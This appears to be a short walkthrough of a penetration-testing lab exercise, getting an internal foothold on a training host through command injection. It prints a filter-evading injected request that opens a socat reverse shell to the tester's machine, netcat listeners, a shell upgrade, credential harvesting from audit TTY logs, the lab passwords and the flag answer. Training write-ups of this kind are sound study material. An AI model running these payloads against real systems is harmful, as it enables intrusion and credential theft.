@@ -1,1 +1,22 @@
 Now that we've thoroughly enumerated and attacked the external perimeter and uncovered a wealth of findings, we're ready to shift gears and focus on obtaining stable internal network access. Per the SoW document, if we can achieve an internal foothold, the client would like us to see how far we can go up to and including gaining Domain Admin level access. In the last section, we worked hard on peeling apart the layers and finding web apps that led to early file read or remote code execution but didn't get us into the internal network. We left off with obtaining RCE on the monitoring.inlanefreight.local application after a hard-fought battle against filters and blacklists set in place to try to prevent Command Injection attacks.
+
+
+This then goes into upgrading the shell and enumerating some linux privs. This is going off the assumption of our RCE on http://monitoring.inlanefreight.local as well so we will start back there and open burp and re do the shell 
+
+
+Question -  Submit the contents of the flag.txt file in the /home/srvadm directory. 
+
+1) add 10.129.248.159     monitoring.inlanefreight.local to /etc/hosts 
+2) open burp in background and go to http://monitoring.inlanefreight.local and remeber the creds we found from last room were admin:12qwaszx 
+3) just like last room, in the wb shell type connection_test and catch it in burp 
+4) change the GET request to -> GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.98:4445${IFS}EXEC:bash
+5) BEFORE HITTING SEND have a nc -nlvp 4445 listener up in terminal 
+6) ** i normally jsut use nc or other rev shells so this is a new way even for me to upgrade with socat..** OPEN ANOTHER nc -nlvp 4443 AND IN OG REV SHELL TYPE THIS COMMAND socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.98:4443
+7) now in the SECOND nc shell we should have it upgraded and itll read: webdev@dmz01:/var/www/html/monitoring$
+8) section tells us to search for creds... use this: aureport --tty | less 
+9) output:
+ 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
+ 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
+10) hit q to exit aureport + new creds -> srvadm:ILFreightnixadm! 
+11) su srvadm -> enter ILFreightnixadm! for password
+12) cat /home/srvadm/flag.txt -> b447c27a00e3a348881b0030177000cd
